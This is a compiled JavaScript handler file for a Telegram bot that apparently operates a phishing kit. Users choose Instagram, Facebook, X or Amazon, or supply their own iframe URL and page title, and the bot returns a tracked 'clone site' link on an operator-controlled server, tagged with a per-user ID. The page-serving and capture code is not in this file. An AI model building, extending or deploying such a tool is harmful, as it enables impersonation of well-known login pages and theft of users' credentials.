"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const bot_1 = __importDefault(require("./bot"));
const commands_1 = require("../commands");
const state_1 = require("../config/state");
const uuid_1 = require("uuid");
exports.default = () => {
    bot_1.default.onText(/\/start/, commands_1.start);
    bot_1.default.onText(/\/set_url/, commands_1.set_url);
    bot_1.default.onText(/\/clone/, commands_1.clone);
    bot_1.default.onText(/\/help/, commands_1.help);
    bot_1.default.onText(/\/version/, commands_1.version);
    bot_1.default.on('callback_query', (callbackquery) => {
        var _a, _b;
        const chatId = (_b = (_a = callbackquery.message) === null || _a === void 0 ? void 0 : _a.chat.id) !== null && _b !== void 0 ? _b : 0;
        const callbackData = callbackquery.data || '';
        function setTarget(targetName) {
            var _a;
            state_1.userStates[chatId] = {
                step: "clone",
                url: targetName,
                title: "",
                uid: ((_a = state_1.userStates[chatId]) === null || _a === void 0 ? void 0 : _a.uid) || (0, uuid_1.v4)()
            };
            let targetUrl = process.env.SITE_URL + `/${targetName}?q=${state_1.userStates[chatId].uid}`;
            bot_1.default.sendMessage(chatId, `CLONE SITE URL: ${targetUrl}`);
        }
        switch (callbackData) {
            case "instagram.com":
                setTarget("instagram.com");
                break;
            case "facebook.com":
                setTarget("facebook.com");
                break;
            case "x.com":
                setTarget("x.com");
                break;
            case "amazon.com":
                setTarget("amazon.com");
                break;
            default:
                bot_1.default.sendMessage(chatId, "Unknown option selected.");
        }
        bot_1.default.answerCallbackQuery(callbackquery.id);
    });
    bot_1.default.on("message", (msg) => {
        var _a;
        const chatId = msg.chat.id;
        const text = msg.text;
        let whitelist = ["/start", "/set_url", "/clone", "/help", "/version"];
        if (state_1.userStates[chatId] && (text === null || text === void 0 ? void 0 : text.split("=")[0]) == "-title") {
            let currentState = state_1.userStates[chatId];
            state_1.userStates[chatId] = {
                step: currentState.step,
                url: currentState.url,
                title: text.split("=")[1],
                uid: currentState.uid
            };
            bot_1.default.sendMessage(chatId, `The site title has been successfully updated to ${text.split("=")[1]}.`);
        }
        if (state_1.userStates[chatId] && (text === null || text === void 0 ? void 0 : text.split("=")[0]) == "-iframe") {
            let currentState = state_1.userStates[chatId];
            state_1.userStates[chatId] = {
                step: currentState.step,
                url: text.split("=")[1],
                title: currentState.title,
                uid: currentState.uid
            };
            bot_1.default.sendMessage(chatId, `The site URL has been successfully updated to ${text.split("=")[1]}.`);
        }
        if (!whitelist.includes(text)) {
            if (state_1.userStates[chatId]) {
                const step = state_1.userStates[chatId].step;
                if (step === "awaiting_url") {
                    state_1.userStates[chatId].url = text;
                    state_1.userStates[chatId].uid = ((_a = state_1.userStates[chatId]) === null || _a === void 0 ? void 0 : _a.uid) || (0, uuid_1.v4)();
                    state_1.userStates[chatId].step = "awaiting_title";
                    bot_1.default.sendMessage(chatId, "Got it! Now Please enter the website title: ");
                }
                else if (step === "awaiting_title") {
                    state_1.userStates[chatId].title = text;
                    state_1.userStates[chatId].step = "done";
                    let targetUrl = `${process.env.SITE_URL}/?q=${state_1.userStates[chatId].uid}`;
                    bot_1.default.sendMessage(chatId, `<b>Iframe URL:</b> ${state_1.userStates[chatId].url}\n<b>Title:</b> ${state_1.userStates[chatId].title}\n<b>Url:</b> <a href="${targetUrl}">${targetUrl}</a>`, { parse_mode: "HTML" });
                }
            }
        }
    });
};
